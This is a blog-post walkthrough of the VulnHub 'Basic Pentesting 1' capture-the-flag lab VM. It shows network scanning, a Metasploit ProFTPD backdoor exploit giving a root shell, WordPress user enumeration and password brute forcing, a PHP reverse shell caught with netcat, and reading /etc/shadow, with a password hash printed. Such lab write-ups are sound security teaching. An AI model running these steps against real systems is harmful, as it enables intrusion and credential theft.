---
layout: post
title:  "Walkthrough : Basic Pentesting"
date:   2020-03-26 23:20:58 +0530
tags: [CTF, vulnhub]
---

{% include toc %}

In this walkthrough we are going to look at various steps of exploiting the end device. The `.ova` file can be downloaded from [www.vulnhub.com](https://www.vulnhub.com/entry/basic-pentesting-1,216/)

# Scanning the network
One of the first steps is to scan the network for open ports and look for vulnerabilities. It can be done using tools/ utilities like `netdiscover` and `nmap`. We will see usage and outcome of both of these tools.
## Using Netdiscover
`eth1` is the interface of the network on which you are listening to the incoming traffic. The interface can be checked by `ifconfig` command.

```
netdiscover -i eth1 -r 10.10.10.0/24
```

```

 Currently scanning: Finished!   |   Screen View: Unique Hosts                       
                                                                                     
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                     
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.10.10.1      0a:00:27:00:00:05      1      60  Unknown vendor                    
 10.10.10.100    08:00:27:72:2f:90      1      60  PCS Systemtechnik GmbH            
 10.10.10.104    08:00:27:c5:db:a3      1      60  PCS Systemtechnik GmbH            
 10.10.10.105    08:00:27:5b:29:29      1      60  PCS Systemtechnik GmbH            

```

[comment]: <> ( // ![screenshot]({{ '/assets/img/posts/netdiscover.png' | relative_url }}) )

## Using Nmap

We can also use `nmap` for target discovery. Since we have already made the target discovery using `netdiscover`, we can move
forward to find open ports and the services running on those ports.

The option
```
-A: Enable OS detection, version detection, script scanning, and traceroute
```

```
nmap -A 10.10.10.104
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-31 13:46 EDT
Nmap scan report for vtcsec (10.10.10.104)
Host is up (0.00065s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:C5:DB:A3 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.65 ms vtcsec (10.10.10.104)
```

[comment]: <> ( ![screenshot]({{ '/assets/img/posts/nmap.png' | relative_url }}) )

# Results of Scanning

In our `nmap` scan results we have found three ports open with three different services running on these ports.
We will try to exploit all these three services one by one to gain a foothold on the target device. Lets start with the easiest.

#  Targeting FTP

From the scan results of `nmap` we have found that ftp version is `ProFTPD 1.3.3c`. We will now kickstart metasploit framework console to find, if we have some exploits for this version of FTP.

```
msfconsole
```

Search the framework for any existing exploits.

```
msf5 > search ProFTPD 1.3.3c

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   1  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   2  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   4  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   6  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution

```

Now we have found an exploit with ranking of `excellent`. Lets try that out.

```
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 10.10.10.103:4444
[*] 10.10.10.104:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo RATOzCBJHKVT6cmO;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "RATOzCBJHKVT6cmO\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (10.10.10.103:4444 -> 10.10.10.104:41092) at 2020-03-27 14:17:39 -0400

pwd
/
whoami
root
```

# Targeting Website

As a first step we need to enumerate the directories of the website. For this we
will use `DirBuster`. This tool is developed by OWASP Foundation to brute force
directories and file names on web/application servers.
This tool is also available in Kali Linux.

In order to use this tool we need to provide the base path of the website and the
wordlist. This wordlist will be used for all the combinations to enumerate the directories. 
We will be using the pre-installed wordlist with Kali Linux.
The path of wordlist list in Kali Linux is

`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

The output of the tool shows that there is an existing `/secret` directory which contains the `index.html` page.

Once we land on the home page, we find that it is a wordpress site but the
layout is not properly formatted. It happens because the webpages are not able
to resolve the links for the stylesheets. In order to overcome this challenge, we need to reslove
the domain name with the IPaddress. For this we will make an entry
into the hosts file of our Kali PC.

```
nano /etc/hosts
10.10.10.104  vtcsec
```

The next step would be to scan for vulnerabilities in wordpress site. This can be done by using
`wpscan`. It can be downloaded from [wpscan.org](https://wpscan.org/). This tool also comes pre-installed
on Kali Linux.

Now, if can somehow exploit the wordpress site to upload our webshell, we can
get acess to the system. One of the simpliest ways is to find the user accounts
and then try to bruteforce the passwords.

Few of interesting options with `wpscan --enumerate` are

```
-e, --enumerate [OPTS]  Enumeration Process
                         Available Choices:
                          vp   Vulnerable plugins
                          ap   All plugins
                          p    Popular plugins
                          vt   Vulnerable themes
                          at   All themes
                          u    User IDs range. e.g: u1-5
                               Range separator to use: '-'
                               Value if no argument supplied: 1-10

```

Let us try to enumerate the users based on user ids.

```
wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm1ppfZZ8FH0
```

`SFQsH.....ayIm1ppfZZ8FH0` is the `api-key` which you get after registering with
[wpvulndb.com](https://wpvulndb.com/)

```
 Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Once we have enumerated the users, we can bruteforce the password. We have downloaded
the wordlist `rockyou-75.txt` from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-75.txt)

```
wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm1ppfZZ8FH0 --usernames 'admin' --passwords "/home/student/rockyou-75.txt"
```

```
[+] Performing password attack on Wp Login against 1 user/s
Trying admin / admin Time: 00:03:36 <======================================================> (19815 / 19815) 100.00% Time: 00:03:36
[SUCCESS] - admin / admin                                                                                                          

[i] Valid Combinations Found:
 | Username: admin, Password: admin
```

With *username* and *password* under our kitty, we can use them to upload the `webshells`. There is a lot of material
avilable to create a webshell in php. You can refer [www.acunetix.com](https://www.acunetix.com/websitesecurity/introduction-web-shells/) for a simple webshell and for using `Weevely`, which is a lightweight PHP telnet-like web-shell. 

However, for our purpose we will be using the webshell provided by [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Just to provide an insight into the 
working of this webshell, it broadly does following :

  1. Creates a deamon in the victim machine, which in turn makes a reverse TCP connection with the  attacker machine. `deamons` are in `unix/linux` what `services` are in windows.
  2. Opens bash shell on victim machine.
  3. The deamon receives the commands from the attacker machine and passes them to the bash shell through pipes.
  4. The response received from the bash shell is passed to the deamon which inturn sends it to the attacker machine through
reverse TCP connection.

Once we upload the shell, which can be done with one of the ways mentioned in [www.hackingarticles.in](https://www.hackingarticles.in/wordpress-reverse-shell/), we get the `www-data` access. In order, for the webshell to connect back
to the Kali attacker machine, we can run `nc`.

```
root@kali:~# nc -lvp 1234
Listening on 0.0.0.0 1234
```

We can also check the status of ports on which the `nc` is running 

```
root@kali:~# netstat -plntu
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      18166/nc            
```

Once, the *webshell* makes a reverse TCP connection we get 

```
root@kali:~# nc -lvp 1234
Listening on 0.0.0.0 1234
Connection received on vtcsec 37790
Linux vtcsec 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 20:31:38 up 2 days, 15:39,  0 users,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cat /etc/shadow
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
```

In order to find *users* in the linux system you can refer this article [linuxize.com](https://linuxize.com/post/how-to-list-users-in-linux/)

The password can be obtained by cracking the hashes using `John the Ripper` or `hashcat`. 
```
1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems
```

